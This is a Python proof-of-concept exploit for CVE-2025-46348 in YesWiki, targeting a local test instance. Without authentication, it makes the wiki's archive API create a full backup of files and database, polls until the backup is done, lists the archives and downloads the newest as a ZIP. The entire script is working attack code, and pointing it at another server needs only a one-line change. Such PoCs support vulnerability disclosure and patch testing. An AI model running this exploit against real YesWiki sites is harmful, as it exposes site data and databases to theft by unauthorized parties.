#!/usr/bin/env python3
import requests
import time
import sys

TARGET_URL = "http://localhost:8085"

def create_backup():
    url = f"{TARGET_URL}/?api/archives"
    data = {
        "action": "startArchive",
        "params[savefiles]": "1",
        "params[savedatabase]": "1"
    }
    try:
        resp = requests.post(url, data=data, timeout=60)
        return resp.status_code, resp.json() if resp.status_code == 200 else resp.text
    except Exception as e:
        return None, str(e)

def check_archive_status(uid):
    url = f"{TARGET_URL}/?api/archives/uidstatus/{uid}"
    try:
        resp = requests.get(url, timeout=30)
        return resp.status_code, resp.json() if resp.status_code == 200 else resp.text
    except Exception as e:
        return None, str(e)

def list_backups():
    url = f"{TARGET_URL}/?api/archives"
    try:
        resp = requests.get(url, timeout=30)
        return resp.status_code, resp.json() if resp.status_code == 200 else resp.text
    except Exception as e:
        return None, str(e)

def download_backup(filename):
    url = f"{TARGET_URL}/?api/archives/{filename}"
    try:
        resp = requests.get(url, timeout=60)
        return resp.status_code, resp.content
    except Exception as e:
        return None, str(e)

def main():
    print("[*] CVE-2025-46348 - YesWiki Unauthenticated Backup PoC")
    print(f"[*] Target: {TARGET_URL}")
    print()

    print("[1] Creating backup without authentication...")
    status, result = create_backup()
    if status == 200 and isinstance(result, dict) and "uid" in result:
        uid = result["uid"]
        print(f"    [+] SUCCESS: Backup started (UID: {uid})")
    else:
        print(f"    [-] Failed to create backup: {status} - {result}")
        sys.exit(1)

    print()
    print("[2] Waiting for backup to complete...")
    for i in range(60):
        time.sleep(5)
        status, info = check_archive_status(uid)
        if status == 200 and isinstance(info, dict):
            if info.get("finished"):
                print(f"    [+] Backup completed")
                break
            elif info.get("running"):
                print(f"    ... Still running (attempt {i+1})")
        else:
            print(f"    [!] Status check failed: {status}")
    else:
        print("    [!] Timeout waiting for backup")

    print()
    print("[3] Listing available backups...")
    status, backups = list_backups()
    if status == 200 and isinstance(backups, list) and len(backups) > 0:
        print(f"    [+] SUCCESS: Found {len(backups)} backup(s)")
        for b in backups:
            print(f"        - {b.get('filename', b)}")
        latest_backup = backups[-1].get("filename") if backups else None
    else:
        print(f"    [-] No backups found: {status} - {backups}")
        sys.exit(1)

    if latest_backup:
        print()
        print(f"[4] Downloading backup: {latest_backup}")
        status, content = download_backup(latest_backup)
        if status == 200 and content:
            print(f"    [+] SUCCESS: Downloaded {len(content)} bytes")
            if content[:4] == b'PK\x03\x04':
                print("    [+] Confirmed: Valid ZIP archive received")
                with open("backup_download.zip", "wb") as f:
                    f.write(content)
                print("    [+] Saved to backup_download.zip")
            else:
                print("    [!] Warning: Content may not be a valid ZIP")
        else:
            print(f"    [-] Failed to download: {status}")

    print()
    print("[*] PoC completed successfully!")
    print("[*] Vulnerability confirmed: Unauthenticated backup creation and download")

if __name__ == "__main__":
    main()
